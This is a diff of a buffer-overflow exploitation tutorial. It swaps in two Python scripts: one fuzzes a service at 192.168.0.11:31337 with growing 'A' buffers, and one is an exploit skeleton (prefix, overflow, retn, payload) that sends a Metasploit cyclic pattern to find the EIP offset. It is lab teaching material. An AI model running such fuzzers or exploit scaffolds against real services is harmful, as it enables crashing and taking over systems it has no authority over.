@@ -44,25 +44,31 @@ There are a lot of different ways you can use ollydbg, but for this use case we'
 The easiest way to stay organized when writing these scripts is to use a skeleton file. The below is the going to be your working grounds for the rest of these exercises. I recommend that after each step has been completed, you create a copy of the script and name it at the step you completed. This way, if you get stuck, you can go back to a working step.
 
 ```Python
-#!/usr/bin/python 
+import socket, time, sys
 
-import socket,sys
+ip = "192.168.0.11"
+port = 31337
+timeout = 5
 
-address = '127.0.0.1'
-port = 9999
-buffer = #TBD
+buffer = []
+counter = 100
+while len(buffer) < 30:
+    buffer.append("A" * counter)
+    counter += 100
 
-try:
-	print '[+] Sending buffer'
-	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	s.connect((address,port))
-	s.recv(1024)			
-	s.send(buffer + '\r\n')
-except:
- 	print '[!] Unable to connect to the application.'
- 	sys.exit(0)
-finally:
-	s.close()
+for string in buffer:
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(timeout)
+        connect = s.connect((ip, port))
+        print("Fuzzing with %s bytes" % len(string))
+        s.send(string + "\r\n")
+        data = s.recv(1024)
+        s.close()
+    except:
+        print("Could not connect to " + ip + ":" + str(port))
+        sys.exit(0)
+    time.sleep(1)
 ```
 
 ## Explanation:
@@ -87,25 +93,30 @@ Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac
 You take the unique string from this script and that becomes your new buffer in bof_skel.py. 
 
 ```Python
-#!/usr/bin/python 
+import socket
 
-import socket,sys
+ip = "192.168.0.11"
+port = 31337
 
-address = '127.0.0.1'
-port = 9999
-buffer = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9'
+prefix = ""
+offset = 0
+overflow = "A" * offset
+retn = ""
+padding = ""
+payload ="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab <SNIP>"
+postfix = ""
+
+buffer = prefix + overflow + retn + padding + payload + postfix
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 try:
-	print '[+] Sending buffer'
-	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	s.connect((address,port))
-	s.recv(1024)			
-	s.send(buffer + '\r\n')
+    s.connect((ip, port))
+    print("Sending evil buffer...")
+    s.send(buffer + "\r\n")
+    print("Done!")
 except:
- 	print '[!] Unable to connect to the application.'
- 	sys.exit(0)
-finally:
-	s.close()
+    print("Could not connect.")
 ```
 
 Send that payload to the application, make sure it crashed and grab the EIP value in the debugger. For this application, it will be 35724134. We will now use a second script from Metasploit called pattern_offset.rb. What this script will do is take that value and seeing exactly where it exists in the buffer length we designate, showing us the point where the buffer will crash. 
